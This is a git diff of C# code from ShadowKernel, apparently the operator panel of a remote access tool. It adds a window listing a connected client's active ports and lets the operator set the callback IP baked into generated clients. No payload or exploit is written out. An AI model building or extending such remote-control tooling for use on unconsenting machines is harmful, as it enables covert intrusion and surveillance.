@@ -15,6 +15,8 @@ using System.Windows.Forms;
 using StreamLibrary;
 using StreamLibrary.UnsafeCodecs;
 using Microsoft.Toolkit.Uwp.Notifications;
+using System.Net;
+using System.Net.Sockets;
 using Telepathy;
 using Message = Telepathy.Message;
 using static ShadowKernel.Classes.Server;
@@ -31,6 +33,7 @@ namespace ShadowKernel.userControls
         public Server serverFrm;
         private CompInfo CI = new CompInfo();
         private TaskManager TM = new TaskManager();
+        private ActivePorts AP = new ActivePorts();
         private HardwareUsage HUV = new HardwareUsage();
         private FileExplorer FE = new FileExplorer();
         private RemoteShell RS = new RemoteShell();
@@ -314,6 +317,10 @@ namespace ShadowKernel.userControls
                 
                 case 21: //Admin Type
                     AddAdmin(ConnectionId, Encoding.UTF8.GetString(ToProcess));
+                    break;
+
+                case 22: //Acive Ports Type
+                    UpdateActivePortsListbox(ConnectionId, Encoding.UTF8.GetString(ToProcess));
                     break;
             }
         }
@@ -717,6 +724,78 @@ namespace ShadowKernel.userControls
             }
         }
 
+
+
+        public struct actPorts
+        {
+            
+            public string pId { get; set; }
+            public string pName { get; set; }
+            public string pPrtcl { get; set; }
+            public string pLocal { get; set; }
+            public string pRemote { get; set; }
+            public string pStatus { get; set; }
+        }
+
+
+
+        /// <summary>
+        /// Updates acive ports list
+        /// </summary>
+        /// <param name="ConnectionId"></param>
+        /// <param name="Processes"></param>
+        public void UpdateActivePortsListbox(int ConnectionId, string Processes)
+        {
+
+            string[] ProcessesArrayRaw = Processes.Split(new[] { "][" }, StringSplitOptions.None);
+            string[] ProcessesArray = ProcessesArrayRaw.Skip(1).ToArray();
+            List<string> ProcessesList = new List<string>(ProcessesArray);
+            ProcessesList.AddRange(ProcessesArray);
+            foreach (ActivePorts AP in System.Windows.Application.Current.Windows.OfType<ActivePorts>())
+                if (AP.Visibility == Visibility.Visible && AP.ConnectionID == ConnectionId && AP.Update)
+                {
+                    actPorts[] p = new actPorts[ProcessesArray.Length - 1];
+                    AP.clientProcesses.ItemsSource = null;
+                    for (int i = 0; i < ProcessesArray.Length - 1; i++)
+                    {
+                        p[i].pId = GetSubstringByString("p1", "}", ProcessesArray[i]);
+                        p[i].pName = GetSubstringByString("p2", "{", ProcessesArray[i]);
+                        p[i].pPrtcl = GetSubstringByString("p3", ";", ProcessesArray[i]);
+                        p[i].pLocal = GetSubstringByString("p4", ">", ProcessesArray[i]);
+                        p[i].pRemote = GetSubstringByString("p5", "<", ProcessesArray[i]);
+                        p[i].pStatus = GetSubstringByString("p6", "]", ProcessesArray[i]);
+                    }
+                    AP.clientProcesses.ItemsSource = p;
+                    AP.clientProcesses.Items.Refresh();
+
+                    return;
+                }
+
+            AP = new ActivePorts();
+            AP.Show();
+            AP.ConnectionID = ConnectionId;
+            AP.Title = "Открытые порты - " + AP.ConnectionID;
+            if (AP.ConnectionID == ConnectionId)
+            {
+                actPorts[] p = new actPorts[ProcessesArray.Length - 1];
+                AP.clientProcesses.ItemsSource = null;
+                for (int i = 0; i < ProcessesArray.Length - 1; i++)
+                {
+                    p[i].pId = GetSubstringByString("p1", "}", ProcessesArray[i]);
+                    p[i].pName = GetSubstringByString("p2", "{", ProcessesArray[i]);
+                    p[i].pPrtcl = GetSubstringByString("p3", ";", ProcessesArray[i]);
+                    p[i].pLocal = GetSubstringByString("p4", ">", ProcessesArray[i]);
+                    p[i].pRemote = GetSubstringByString("p5", "<", ProcessesArray[i]);
+                    p[i].pStatus = GetSubstringByString("p6", "]", ProcessesArray[i]);
+                }
+                AP.clientProcesses.ItemsSource = p;
+                AP.clientProcesses.Items.Refresh();
+            }
+        }
+
+
+
+
         /// <summary>
         /// Update remote shell with output
         /// </summary>
@@ -892,14 +971,29 @@ namespace ShadowKernel.userControls
             Port.Text = Properties.Settings.Default.Port.ToString();
             UpInt.Text = Properties.Settings.Default.UpdateInterval.ToString();
             notify.IsChecked = Properties.Settings.Default.Notfiy;
+            Dns.Text = GetLocalIPAddress();
+        }
+
+
+        public string GetLocalIPAddress()
+        {
+            var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());
+            foreach (var ip in host.AddressList)
+            {
+                if (ip.AddressFamily == AddressFamily.InterNetwork)
+                {
+                    return ip.ToString();
+                }
+            }
+            throw new Exception("No network adapters with an IPv4 address in the system!");
         }
 
         private void Button_Click_1(object sender, RoutedEventArgs e)
         {
-            if(Tag.Text == "") { Tag.Focus(); return; }
 
-            string hostName = System.Net.Dns.GetHostName();
-            string myIP = System.Net.Dns.GetHostAddresses(hostName)[1].ToString();
+            if (Tag.Text == "") { Tag.Focus(); return; }
+            System.Net.IPAddress ip;
+            if(!System.Net.IPAddress.TryParse(Dns.Text, out ip)) { Dns.Text = ""; Dns.Focus(); return; }
 
             Builder ClientBuilder = new Builder();
             try
@@ -920,7 +1014,7 @@ namespace ShadowKernel.userControls
             {
                 Dispatcher.Invoke(() =>
                 {
-                    ClientBuilder.BuildClient(Port.Text, helper.Session.CurrentAuditer.Login.ToString(), myIP, dlg.FileName, Tag.Text, "1",
+                    ClientBuilder.BuildClient(Port.Text, helper.Session.CurrentAuditer.Login.ToString(), Dns.Text, dlg.FileName, Tag.Text, "1",
                     "False", "False");
                     System.Diagnostics.Process.Start("explorer.exe", dlg.FileName.Substring(0, dlg.FileName.LastIndexOf("\\")));
                 });
